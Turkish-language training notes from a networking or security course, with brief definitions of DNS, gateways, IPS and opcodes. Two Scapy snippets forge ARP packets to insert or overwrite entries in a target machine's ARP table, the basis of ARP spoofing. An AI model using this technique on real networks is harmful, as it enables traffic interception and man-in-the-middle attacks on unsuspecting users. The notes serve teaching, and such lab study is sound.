**3.Gün  22.07.2018**

DNS, UDP’den ve TCP’den çalışabilir

Bir protocol bir katmanda olacak diye birşey yok birden fazla katmanda da yeralabilir.

Gateway: LAN (=Local Area Network) ağında ki diğer bilgisayarlarla iletişim için veri paketlerinin ağ (network) dışına çıkmasını sağlayan bir kapı gibi düşünülebilir.

Cloudflare'ın yeni DNS sunucusu 1.1.1.1

**IPS** trafiğe ait paketleri inceler, uygulamalara yönelik zararlı paketleri raporlar ve ağ içerisine girişini engeller.

**OP Code** (Operation Code), işlem kodu, bilgisayar teknolojisinde makine dili komutunun, gerçekleştirilecek işlemi belirten kısmıdır.


**Scapy ile Karşı Makinenin ARP tablosuna IP eklemek için**:
```
$ scapy
>>> etherbaslik= Ether(dst="ff:ff:ff:ff:ff:ff",src=<"SRC_MAC_ADDR")
>>> arpbaslik=ARP(op=1,hwdst="<DEST_MAC_ADDR>",psrc="<DEFAULT_IP>",pdst="<TARGET_IP>",hwsrc="<SRC_MAC_ADDR>"
>>> paket = etherbaslik/arpbaslik
>>> sendp(paket,iface="eth0")
.
Sent 1 packets.
```

**Scapy ile Karşı Makine ARP tablosunda IP adresinin MAC adresini değiştirmek için**:

**NOT:** Karşı makinenin ARP tablosunda Kaynak IP adresinin tanımlı olması gerekir.

Bunun için; **ping -c 1 <DEST_IP>**
```
$scapy
>> etherbaslik=Ether(dst=<"DEST_MAC_ADDR">,src="31:31:30:30:30:31")
>>> arpbaslik=ARP(op=2,hwsrc="31:31:30:30:30:31",psrc=<"SRC_IP_ADDR">,pdst=<"DEST_IP_ADDR">)
>>> paket=etherbaslik/arpbaslik
>>> sendp(paket,iface="eth0")
.
Sent 1 packets.
```
